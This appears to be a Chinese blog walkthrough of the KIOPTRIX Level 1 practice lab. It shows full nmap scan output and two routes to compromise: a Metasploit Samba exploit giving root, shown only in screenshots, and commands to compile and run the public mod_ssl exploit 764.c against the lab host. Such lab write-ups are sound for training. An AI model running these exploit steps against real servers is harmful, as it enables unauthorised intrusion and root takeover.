---
# 这是页面的图标
icon: api
# 这是文章的标题
title: 靶机 KIOPTRIX:LEVEL 1 Walkthrough
# 设置作者
author: lhz
# 设置写作时间
time: 2022-03-21
# 一个页面只能有一个分类
category: 渗透
# 一个页面可以有多个标签
tag:
  - 渗透
  - 靶机
comment: false

typora-root-url: ..\..\..\.vuepress\public

---
## 0x01 扫描

扫描IP，发现主机IP

192.168.56.104

扫描端口

`nmap -T5 -A -v -p- 192.168.56.104`

```
└─$ nmap -T5 -A -v -p- 192.168.56.104  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-21 00:14 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 00:14
Completed NSE at 00:14, 0.00s elapsed
Initiating NSE at 00:14
Completed NSE at 00:14, 0.00s elapsed
Initiating NSE at 00:14
Completed NSE at 00:14, 0.00s elapsed
Initiating Ping Scan at 00:14
Scanning 192.168.56.104 [2 ports]
Completed Ping Scan at 00:14, 0.00s elapsed (1 total hosts)
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Initiating Connect Scan at 00:14
Scanning 192.168.56.104 [65535 ports]
Discovered open port 443/tcp on 192.168.56.104
Discovered open port 111/tcp on 192.168.56.104
Discovered open port 80/tcp on 192.168.56.104
Discovered open port 139/tcp on 192.168.56.104
Discovered open port 22/tcp on 192.168.56.104
Discovered open port 1024/tcp on 192.168.56.104
Completed Connect Scan at 00:14, 4.34s elapsed (65535 total ports)
Initiating Service scan at 00:14
Scanning 6 services on 192.168.56.104
Completed Service scan at 00:14, 11.01s elapsed (6 services on 1 host)
NSE: Script scanning 192.168.56.104.
Initiating NSE at 00:14
Completed NSE at 00:14, 10.42s elapsed
Initiating NSE at 00:14
Completed NSE at 00:14, 1.15s elapsed
Initiating NSE at 00:14
Completed NSE at 00:14, 0.00s elapsed
Nmap scan report for 192.168.56.104
Host is up (0.00031s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE
|_  Potentially risky methods: TRACE
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1           1024/tcp   status
|_  100024  1           1024/udp   status
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: md5WithRSAEncryption
| Not valid before: 2009-09-26T09:32:06
| Not valid after:  2010-09-26T09:32:06
| MD5:   78ce 5293 4723 e7fe c28d 74ab 42d7 02f1
|_SHA-1: 9c42 91c3 bed2 a95b 983d 10ac f766 ecb9 8766 1d33
|_ssl-date: 2022-03-21T17:14:49+00:00; +12h59m59s from scanner time.
| http-methods: 
|_  Supported Methods: GET HEAD POST
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
|_http-title: 400 Bad Request
1024/tcp open  status      1 (RPC #100024)

Host script results:
|_clock-skew: 12h59m58s
|_smb2-time: Protocol negotiation failed (SMB2)
| nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KIOPTRIX<00>         Flags: <unique><active>
|   KIOPTRIX<03>         Flags: <unique><active>
|   KIOPTRIX<20>         Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   MYGROUP<00>          Flags: <group><active>
|   MYGROUP<1d>          Flags: <unique><active>
|_  MYGROUP<1e>          Flags: <group><active>

NSE: Script Post-scanning.
Initiating NSE at 00:14
Completed NSE at 00:14, 0.00s elapsed
Initiating NSE at 00:14
Completed NSE at 00:14, 0.00s elapsed
Initiating NSE at 00:14
Completed NSE at 00:14, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.20 seconds

```

## 0x02 方法一

发现samba，使用smbclinet没有扫出来版本，使用msf扫描发现版本

![image-20220415181220010](/assets/img/image-20220415181220010.png)

搜索exp发现

![image-20220415181234735](/assets/img/image-20220415181234735.png)

使用msf利用



![image-20220415181245923](/assets/img/image-20220415181245923.png)

尝试payload，修改LHOST后利用成功，获得root权限

![image-20220415181255633](/assets/img/image-20220415181255633.png)

![image-20220415181300663](/assets/img/image-20220415181300663.png)

## 0x03 方法二

​	使用nikto扫描

![image-20220415181311227](/assets/img/image-20220415181311227.png)

发现mod_ssl存在问题，搜索exp

![image-20220415181318656](/assets/img/image-20220415181318656.png)

尝试使用764

还需要安装libssl-dev: 

```
apt-get install libssl-dev
```

编译764.c

```
gcc -o 764 764.c -lcrypto
```

执行exp

```
./764 0x6b 192.168.56.104 443 -c 50
```

因为网络问题，目标机无法下载COMMAND2下载提权代码，所以只获得apache权限，正常情况下可以直接获得root权限
